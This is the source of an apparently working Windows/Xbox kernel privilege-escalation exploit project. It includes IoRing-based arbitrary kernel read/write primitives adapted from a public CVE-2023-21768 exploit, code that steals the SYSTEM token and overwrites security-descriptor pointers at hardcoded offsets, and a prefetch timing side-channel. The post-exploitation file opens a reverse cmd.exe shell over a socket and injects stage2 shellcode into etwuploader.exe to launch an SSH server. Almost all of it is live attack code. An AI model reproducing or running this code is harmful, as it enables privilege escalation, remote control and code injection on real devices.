<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="collat_payload.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ioring_lpe.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="post_exploit.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="nt_offsets.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="win_defs.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ioring.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="nt_offsets.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="post_exploit.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <MASM Include="prefetch_asm.asm">
      <Filter>Source Files</Filter>
    </MASM>
  </ItemGroup>
</Project>
```

`collat_payload/ioring.h`:

```h
#ifndef _IORING_H_
#define _IORING_H_

#include "win_defs.h"

typedef struct _NT_IORING_CREATE_FLAGS
{
    enum _NT_IORING_CREATE_REQUIRED_FLAGS Required;
    enum _NT_IORING_CREATE_ADVISORY_FLAGS Advisory;
} NT_IORING_CREATE_FLAGS, * PNT_IORING_CREATE_FLAGS;

typedef struct _NT_IORING_INFO
{
    enum IORING_VERSION IoRingVersion;
    struct _NT_IORING_CREATE_FLAGS Flags;
    unsigned int SubmissionQueueSize;
    unsigned int SubmissionQueueRingMask;
    unsigned int CompletionQueueSize;
    unsigned int CompletionQueueRingMask;
    struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
} NT_IORING_INFO, * PNT_IORING_INFO;

typedef struct _IOP_MC_BUFFER_ENTRY
{
    USHORT Type;
    USHORT Reserved;
    ULONG Size;
    ULONG ReferenceCount;
    ULONG Flags;
    LIST_ENTRY GlobalDataLink;
    PVOID Address;
    ULONG Length;
    CHAR AccessMode;
    ULONG MdlRef;
    struct _MDL* Mdl;
    KEVENT MdlRundownEvent;
    PULONG64 PfnArray;
    BYTE PageNodes[0x20];
} IOP_MC_BUFFER_ENTRY, * PIOP_MC_BUFFER_ENTRY;

typedef struct _IORING_OBJECT
{
    short Type;
    short Size;
    struct _NT_IORING_INFO UserInfo;
    void* Section;
    struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    struct _MDL* CompletionQueueMdl;
    struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
    unsigned __int64 ViewSize;
    long InSubmit;
    unsigned __int64 CompletionLock;
    unsigned __int64 SubmitCount;
    unsigned __int64 CompletionCount;
    unsigned __int64 CompletionWaitUntil;
    struct _KEVENT CompletionEvent;
    unsigned char SignalCompletionEvent;
    struct _KEVENT* CompletionUserEvent;
    unsigned int RegBuffersCount;
    struct _IOP_MC_BUFFER_ENTRY** RegBuffers;
    unsigned int RegFilesCount;
    void** RegFiles;
} IORING_OBJECT, * PIORING_OBJECT;

typedef struct _HIORING
{
    HANDLE handle;
    NT_IORING_INFO Info;
    ULONG IoRingKernelAcceptedVersion;
    PVOID RegBufferArray;
    ULONG BufferArraySize;
    PVOID Unknown;
    ULONG FileHandlesCount;
    ULONG SubQueueHead;
    ULONG SubQueueTail;
}_HIORING;

int ioring_setup(PIORING_OBJECT* ppIoRingAddr);
void kwrite(UINT64 addr, PVOID data, SIZE_T size);
int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, DWORD dwFakeRegBufferCnt, UINT64 ioring_addr, UINT64 nt_base);
int map_region();
int race_succeeded(ULONG ulFakeRegBufferCnt, UINT64 ioring_addr);

#endif
```

`collat_payload/ioring_lpe.c`:

```c
//
// chompie's ioring_lpe.c (https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768/blob/master/Windows_AFD_LPE_CVE-2023-21768/ioring_lpe.c)
// plus a bunch of messy changes for this scenario~
//
#include <windows.h>
#include <ioringapi.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>

#include "ioring.h"
#include "win_defs.h"
#include "nt_offsets.h"

HIORING hIoRing = NULL;
PIORING_OBJECT pIoRing = NULL;
HANDLE hInPipe = INVALID_HANDLE_VALUE;
HANDLE hOutPipe = INVALID_HANDLE_VALUE;
HANDLE hInPipeClient = INVALID_HANDLE_VALUE;
HANDLE hOutPipeClient = INVALID_HANDLE_VALUE;


int ioring_setup(PIORING_OBJECT* ppIoRingAddr)
{
    int ret = -1;
    IORING_CREATE_FLAGS ioRingFlags = { 0 };
    CHAR in_path[0x400] = { 0 };
    CHAR out_path[0x400] = { 0 };
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\in_file.bin", in_path, sizeof(in_path));
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\out_file.bin", out_path, sizeof(out_path));

    ioRingFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    ioRingFlags.Advisory = IORING_CREATE_REQUIRED_FLAGS_NONE;

    ret = CreateIoRing(IORING_VERSION_3, ioRingFlags, 0x10000, 0x20000, &hIoRing);

    if (0 != ret)
    {
        goto done;
    }

    ret = getobjptr(ppIoRingAddr, GetCurrentProcessId(), *(PHANDLE)hIoRing);

    if (0 != ret)
    {
        goto done;
    }

    pIoRing = *ppIoRingAddr;

    hInPipe = CreateFileA(in_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    hOutPipe = CreateFileA(out_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if ((INVALID_HANDLE_VALUE == hInPipe) || (INVALID_HANDLE_VALUE == hOutPipe))
    {
        ret = GetLastError();
        goto done;
    }

    hInPipeClient = CreateFileA(in_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    hOutPipeClient = CreateFileA(out_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if ((INVALID_HANDLE_VALUE == hInPipeClient) || (INVALID_HANDLE_VALUE == hOutPipeClient))
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int getobjptr(PULONG64 ppObjAddr, ULONG ulPid, HANDLE handle)
{
    int ret = -1;
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    ULONG ulBytes = 0;
    NTSTATUS ntStatus = STATUS_SUCCESS;

    while ((ntStatus = NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (pHandleInfo != NULL)
        {
            pHandleInfo = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 * ulBytes);
        }

        else
        {
            pHandleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    if (ntStatus != STATUS_SUCCESS)
    {
        ret = ntStatus;
        goto done;
    }

    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
    {
        if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == handle))
        {
            *ppObjAddr = pHandleInfo->Handles[i].Object;
            ret = 0;
            break;
        }
    }

done:
    if (NULL != pHandleInfo)
    {
        HeapFree(GetProcessHeap(), 0, pHandleInfo);
    }
    return ret;
}

int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen)
{
    int ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hOutPipeClient);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };

    pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = pReadAddr;
    pMcBufferEntry->Length = ulReadLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffers[0] = pMcBufferEntry;

    ret = BuildIoRingWriteFile(hIoRing, reqFile, reqBuffer, ulReadLen, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        goto done;
    }

    ret = SubmitIoRing(hIoRing, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = PopIoRingCompletion(hIoRing, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    if (0 == ReadFile(hOutPipe, pReadBuffer, ulReadLen, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}

int ioring_write(PULONG64 pRegisterBuffers, ULONG64 pWriteAddr, PVOID pWriteBuffer, ULONG ulWriteLen)
{
    int ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hInPipeClient);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };
    CHAR dbg_msg[0x200];


    //sprintf(dbg_msg, "ioring_write: %p %p %i\n", pWriteAddr, pWriteBuffer, ulWriteLen);
    //OutputDebugStringA(dbg_msg);
    //DebugBreak();
    SetFilePointer(hInPipe, 0, NULL, FILE_BEGIN);
    if (0 == WriteFile(hInPipe, pWriteBuffer, ulWriteLen, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }
    FlushFileBuffers(hInPipe);
    SetFilePointer(hInPipe, 0, NULL, FILE_BEGIN);

    pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = pWriteAddr;
    pMcBufferEntry->Length = ulWriteLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffers[0] = pMcBufferEntry;

    SetFilePointer(hInPipeClient, 0, NULL, FILE_BEGIN);
    ret = BuildIoRingReadFile(hIoRing, reqFile, reqBuffer, ulWriteLen, 0, NULL, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        goto done;
    }

    ret = SubmitIoRing(hIoRing, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = PopIoRingCompletion(hIoRing, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}

int map_region()
{
    PVOID pFakeRegBuffers = VirtualAlloc(0x65000000, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    //printf("mapped addr: %p\n", pFakeRegBuffers);

    if (pFakeRegBuffers != (PVOID)0x65000000)
    {
        //printf("failed to map buffer!\n");
        return 0;
    }

    return 1;
}

int race_succeeded(ULONG ulFakeRegBufferCnt, UINT64 ioring_addr)
{
    _HIORING* phIoRing = NULL;

    PVOID pFakeRegBuffers = 0x65007500;


    memset(pFakeRegBuffers, 0, sizeof(ULONG64) * 0x1000);

    phIoRing = *(_HIORING**)&hIoRing;
    phIoRing->RegBufferArray = pFakeRegBuffers;
    phIoRing->BufferArraySize = ulFakeRegBufferCnt;


    BYTE zero_buf[0x20];
    memset(zero_buf, 0, sizeof(zero_buf));

    // quickly fix up the event ptrs
    int ret = ioring_write(pFakeRegBuffers, (ioring_addr + 0x90), &zero_buf, 0x20);

    if (ret != 0)
    {
        return 0;
    }

    return 1;
}

void kwrite(UINT64 addr, PVOID data, SIZE_T size) {
    ioring_write(0x65007500, &pIoRing->RegBuffersCount, data, size);

}


int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCnt, UINT64 ioring_addr, UINT64 nt_base)
{
    int ret = -1;
    HANDLE hProc = NULL;
    ULONG64 ullSystemEPROCaddr = 0;
    ULONG64 ullTargEPROCaddr = 0;
    PVOID pFakeRegBuffers = NULL;
    _HIORING* phIoRing = NULL;
    ULONG64 ullSysToken = 0;
    char null[0x10] = { 0 };

    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);

    if (NULL == hProc)
    {
        ret = GetLastError();
        return ret;
    }

    ret = getobjptr(&ullSystemEPROCaddr, 4, 4);

    if (0 != ret)
    {
        return ret;
    }

    ret = getobjptr(&ullTargEPROCaddr, GetCurrentProcessId(), hProc);

    if (0 != ret)
    {
        return 0;
    }

    pFakeRegBuffers = 0x65007500;


    memset(pFakeRegBuffers, 0, sizeof(ULONG64) * ulFakeRegBufferCnt);

    phIoRing = *(_HIORING**)&hIoRing;
    phIoRing->RegBufferArray = pFakeRegBuffers;
    phIoRing->BufferArraySize = ulFakeRegBufferCnt;


    BYTE zero_buf[0x20];
    memset(zero_buf, 0, sizeof(zero_buf));

    // quickly fix up the event ptrs
    ioring_write(pFakeRegBuffers, (ioring_addr + 0x90), &zero_buf, 0x20);

    ret = ioring_read(pFakeRegBuffers, ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));

    if (0 != ret)
    {
        //wprintf(L"token read failed!\n");
        return 0;
    }

    ret = ioring_write(pFakeRegBuffers, ullTargEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));

    if (0 != ret)
    {
        //  wprintf(L"token write failed\n");
    }

    UINT64 orig_val = nt_base + get_orig_sd_offset();
    ret = ioring_write(pFakeRegBuffers, nt_base + get_sd_ptr_offset(), &orig_val, sizeof(orig_val));

    ioring_write(pFakeRegBuffers, &pIoRing->RegBuffersCount, &null, 0x10);

}

```

`collat_payload/nt_offsets.c`:

```c
#include "nt_offsets.h"

#include <Windows.h>

ULONG build_rev = 0;

VOID set_build_rev(ULONG rev)
{
	build_rev = rev;
}

UINT64 get_sd_ptr_offset()
{
	if (build_rev == 4478)
	{
		return SD_PTR_OFFSET_4478;
	}
	else if (build_rev == 4908 || 4909)
	{
		return SD_PTR_OFFSET_4908;
	}

	return 0;
}

UINT64 get_orig_sd_offset()
{
	if (build_rev == 4478)
	{
		return ORIG_SD_OFFSET_4478;
	}
	else if (build_rev == 4908 || 4909)
	{
		return ORIG_SD_OFFSET_4908;
	}

	return 0;
}
```

`collat_payload/nt_offsets.h`:

```h
#ifndef _NT_OFFSETS
#define _NT_OFFSETS
#include <Windows.h>


// PC
//#define ORIG_SD_OFFSET 0xd55f20
//#define SD_PTR_OFFSET 0xd55658

// Xbox - 4478
#define ORIG_SD_OFFSET_4478 0xC62B8
#define SD_PTR_OFFSET_4478 0xC5A58

// Xbox - 4908/4909
#define ORIG_SD_OFFSET_4908 0xC62B8
#define SD_PTR_OFFSET_4908 0xC5A48

VOID set_build_rev(ULONG rev);
UINT64 get_sd_ptr_offset();
UINT64 get_orig_sd_offset();


#endif

```

`collat_payload/post_exploit.c`:

```c
#include "post_exploit.h"

#include <stdio.h>
#include <psapi.h>
#include <ws2tcpip.h>

#define POST_EXPLOIT_REVERSE_SHELL 0

typedef struct {
    const char* image_name;
    const char* image_args;
} SHELLCODE_ARGS;

void post_exploit_simple_reverse_shell(SOCKET sock) {
    // Spawn CMD using the socket for input and output
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "S:\\", &sinfo, &pinfo);
}

void post_exploit_spawn_ssh_server(SOCKET sock) {
    CHAR* cur_msg[0x200] = { 0 };

    // We leave this commented for easy debugging

    //// Spawn CMD using the sock for input and output
    //STARTUPINFO sinfo;
    //PROCESS_INFORMATION pinfo;

    //memset(&sinfo, 0, sizeof(sinfo));
    //memset(&pinfo, 0, sizeof(pinfo));

    //sinfo.cb = sizeof(sinfo);
    //sinfo.dwFlags = STARTF_USESTDHANDLES;
    //sinfo.hStdError = (HANDLE)sock;
    //sinfo.hStdInput = (HANDLE)sock;
    //sinfo.hStdOutput = (HANDLE)sock;

    //sprintf(cur_msg, "Creating conhost process\n");
    //send(sock, cur_msg, strlen(cur_msg), 0);

    //CreateProcessA(NULL, "conhost.exe", NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &sinfo, &pinfo);

    //HANDLE target_process = pinfo.hProcess;
    //DWORD target_pid = pinfo.dwProcessId;

    // TO REMOVE ETWUPLOADER INJECTION, COMMENT FROM HERE TO NEXT MARKER

    HANDLE target_process = INVALID_HANDLE_VALUE;
    DWORD target_pid = -1;

    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    sprintf(cur_msg, "Enumerating processes\n");
    send(sock, cur_msg, strlen(cur_msg), 0);

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        sprintf(cur_msg, "EnumProcessesFailed\n");
        send(sock, cur_msg, strlen(cur_msg), 0);
        return 1;
    }


    // Calculate how many process identifiers were returned.

    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process.

    for (i = 0; i < cProcesses; i++)
    {
        DWORD pid = aProcesses[i];
        if (pid != 0)
        {
            CHAR szProcessName[MAX_PATH] = "<unknown>";

            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,
                FALSE, pid);

            if (NULL != hProcess)
            {
                HMODULE hMod;
                DWORD cbNeeded;

                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
                    &cbNeeded))
                {
                    GetModuleBaseNameA(hProcess, hMod, szProcessName,
                        sizeof(szProcessName) / sizeof(CHAR));
                }

                sprintf(cur_msg, "Process: %s\n", szProcessName);
                send(sock, cur_msg, strlen(cur_msg), 0);

                if (strcmp(szProcessName, "etwuploader.exe") == 0) {
                    sprintf(cur_msg, "Found etwuploader.exe\n");
                    send(sock, cur_msg, strlen(cur_msg), 0);

                    target_process = hProcess;
                    target_pid = pid;

                    break;
                }

                CloseHandle(hProcess);
            }
        }
    }

    // MARKER

    sprintf(cur_msg, "Injecting SSH server into PID: %d\n", target_pid);
    send(sock, cur_msg, strlen(cur_msg), 0);

    CHAR stage2_path[0x200] = { 0 };
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\stage2.bin", stage2_path, sizeof(stage2_path));

    sprintf(cur_msg, "Loading stage2 from: %s\n", stage2_path);
    send(sock, cur_msg, strlen(cur_msg), 0);

    HANDLE filehandle = CreateFileA(stage2_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
    if (filehandle == INVALID_HANDLE_VALUE) {
        sprintf(cur_msg, "Failed to load stage2\n");
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
        return;
    }

    DWORD file_size = GetFileSize(filehandle, NULL);

    sprintf(cur_msg, "Allocating memory for the shellcode in the remote process\n");
    send(sock, cur_msg, strlen(cur_msg), 0);

    LPVOID shellcode_addr = VirtualAllocEx(target_process, 0, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HANDLE h_heap = GetProcessHeap();
    BYTE* shellcode_data = HeapAlloc(h_heap, 0, file_size);

    DWORD remaining = file_size;
    DWORD bytes_read = 0;

    while (remaining > 0) {
        ReadFile(filehandle, shellcode_data + (file_size - remaining), remaining, &bytes_read, NULL);
        remaining -= bytes_read;
    }

    CloseHandle(filehandle);

    sprintf(cur_msg, "Writing shellcode\n");
    send(sock, cur_msg, strlen(cur_msg), 0);
    WriteProcessMemory(target_process, shellcode_addr, shellcode_data, file_size, NULL);

    sprintf(cur_msg, "VirtualProtecting shellcode\n");
    send(sock, cur_msg, strlen(cur_msg), 0);
    DWORD old_protection = 0;
    VirtualProtectEx(target_process, shellcode_addr, file_size, PAGE_EXECUTE_READ, &old_protection);


    sprintf(cur_msg, "Creating remote thread\n");
    send(sock, cur_msg, strlen(cur_msg), 0);

    char srv_name[0x200] = { 0 };
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\srv.exe", srv_name, sizeof(srv_name));
    sprintf(cur_msg, "New process to be started: %s\n", srv_name);
    send(sock, cur_msg, strlen(cur_msg), 0);

    LPVOID image_name = VirtualAllocEx(target_process, 0, sizeof(srv_name), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(target_process, image_name, srv_name, sizeof(srv_name), NULL);

    SHELLCODE_ARGS args = {
        image_name,
        NULL,
    };

    LPVOID args_addr = VirtualAllocEx(target_process, 0, sizeof(args), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    sprintf(cur_msg, "Args will be allocated at: %p\n", args_addr);
    send(sock, cur_msg, strlen(cur_msg), 0);

    WriteProcessMemory(target_process, args_addr, &args, sizeof(args), NULL);

    HANDLE thread_handle = CreateRemoteThread(target_process, NULL, 0, shellcode_addr, args_addr, 0, NULL);
    //ResumeThread(thread_handle);
    sprintf(cur_msg, "Remote thread HANDLE: %p\n", thread_handle);
    send(sock, cur_msg, strlen(cur_msg), 0);

    sprintf(cur_msg, "Collat payload is done! See the payload server instructions for how to connect\n");
    send(sock, cur_msg, strlen(cur_msg), 0);

    // Close the socket so the other side knows we're done
    shutdown(sock, SD_BOTH);
    closesocket(sock);
}

// Put your own code in here!
// Provided is a simple reverse shell example
void post_exploit(SOCKET sock)
{
#if POST_EXPLOIT_REVERSE_SHELL
    post_exploit_simple_reverse_shell(sock);
#else
    post_exploit_spawn_ssh_server(sock);
#endif

    // Loop forever
    while (1) {}
}

```

`collat_payload/post_exploit.h`:

```h
#ifndef _POST_EXPLOIT_H
#define _POST_EXPLOIT_H
#include <winsock2.h>

void post_exploit(SOCKET sock);

#endif

```

`collat_payload/prefetch_asm.asm`:

```asm
; -----------------------------------------------------------------------------------------------------------	
; based on entrybleed (https://www.willsroot.io/2022/12/entrybleed.html)
; adapted to windows by exploits.forsale
; assembly based on example by Elias Bachaalany <lallousz-x86@yahoo.com> http://lallouslab.net


; -----------------------------------------------------------------------------------------------------------	
; Exported symbols
PUBLIC sidechannel
PUBLIC bad_syscall

; -----------------------------------------------------------------------------------------------------------	
; Text segment
; -----------------------------------------------------------------------------------------------------------	
_TEXT	SEGMENT


sidechannel PROC
	push rbx
	push rsi
	push rdi
	mov rsi, rcx ; save the address away

	mfence
	rdtscp
	mov r9, rax
	mov r8, rdx
	xor rax, rax
	lfence

	prefetchnta byte ptr [rsi]
	prefetcht2 byte ptr [rsi]

	lfence
	rdtscp
	mov rdi, rax
	mov rsi, rdx

	mfence

	mov rbx, r8
	shl rbx, 32
	or rbx, r9

	mov rax, rsi
	shl rax, 32
	or rax, rdi

	sub rax, rbx
	pop rdi
	pop rsi
	pop rbx
	ret
sidechannel ENDP

bad_syscall PROC
	mov rax, 99999
	syscall
	ret
bad_syscall ENDP


_TEXT	ENDS

END
```

`collat_payload/win_defs.h`:

```h
#ifndef _WIN_DEFS_H_
#define _WIN_DEFS_H_
#include <Windows.h>
#include <winternl.h>

#define SystemHandleInformation 16

#define EPROC_TOKEN_OFFSET 0x4b8

#define SystemHandleInformation (SYSTEM_INFORMATION_CLASS)16

typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    BOOLEAN TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    unsigned short UniqueProcessId;
    unsigned short CreatorBackTraceIndex;
    unsigned char ObjectTypeIndex;
    unsigned char HandleAttributes;
    unsigned short HandleValue;
    void* Object;
    unsigned long GrantedAccess;
    long __PADDING__[1];
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    unsigned long NumberOfHandles;
    struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _DISPATCHER_HEADER
{
    union
    {
        volatile long Lock;
        long LockNV;
        struct
        {
            unsigned char Type;
            unsigned char Signalling;
            unsigned char Size;
            unsigned char Reserved1;
        };
        struct
        {
            unsigned char TimerType;
            union
            {
                unsigned char TimerControlFlags;
                struct
                {
                    struct
                    {
                        unsigned char Absolute : 1;
                        unsigned char Wake : 1;
                        unsigned char EncodedTolerableDelay : 6;
                    };
                    unsigned char Hand;
                    union
                    {
                        unsigned char TimerMiscFlags;
                        struct
                        {
                            unsigned char Index : 6;
                            unsigned char Inserted : 1;
                            volatile unsigned char Expired : 1;
                        };
                    };
                };
            };
        };
        struct
        {
            unsigned char Timer2Type;
            union
            {
                unsigned char Timer2Flags;
                struct
                {
                    struct
                    {
                        unsigned char Timer2Inserted : 1;
                        unsigned char Timer2Expiring : 1;
                        unsigned char Timer2CancelPending : 1;
                        unsigned char Timer2SetPending : 1;
                        unsigned char Timer2Running : 1;
                        unsigned char Timer2Disabled : 1;
                        unsigned char Timer2ReservedFlags : 2;
                    };
                    unsigned char Timer2ComponentId;
                    unsigned char Timer2RelativeId;
                };
            };
        };
        struct
        {
            unsigned char QueueType;
            union
            {
                unsigned char QueueControlFlags;
                struct
                {
                    struct
                    {
                        unsigned char Abandoned : 1;
                        unsigned char DisableIncrement : 1;
                        unsigned char QueueReservedControlFlags : 6;
                    };
                    unsigned char QueueSize;
                    unsigned char QueueReserved;
                };
            };
        };
        struct
        {
            unsigned char ThreadType;
            unsigned char ThreadReserved;
            union
            {
                unsigned char ThreadControlFlags;
                struct
                {
                    struct
                    {
                        unsigned char CycleProfiling : 1;
                        unsigned char CounterProfiling : 1;
                        unsigned char GroupScheduling : 1;
                        unsigned char AffinitySet : 1;
                        unsigned char Tagged : 1;
                        unsigned char EnergyProfiling : 1;
                        unsigned char SchedulerAssist : 1;
                        unsigned char ThreadReservedControlFlags : 1;
                    };
                    union
                    {
                        unsigned char DebugActive;
                        struct
                        {
                            unsigned char ActiveDR7 : 1;
                            unsigned char Instrumented : 1;
                            unsigned char Minimal : 1;
                            unsigned char Reserved4 : 2;
                            unsigned char AltSyscall : 1;
                            unsigned char Emulation : 1;
                            unsigned char Reserved5 : 1;
                        };
                    };
                };
            };
        };
        struct
        {
            unsigned char MutantType;
            unsigned char MutantSize;
            unsigned char DpcActive;
            unsigned char MutantReserved;
        };
    };
    long SignalState;
    LIST_ENTRY WaitListHead;
} DISPATCHER_HEADER, * PDISPATCHER_HEADER;

typedef struct _KEVENT
{
    struct _DISPATCHER_HEADER Header;
} KEVENT, * PKEVENT;


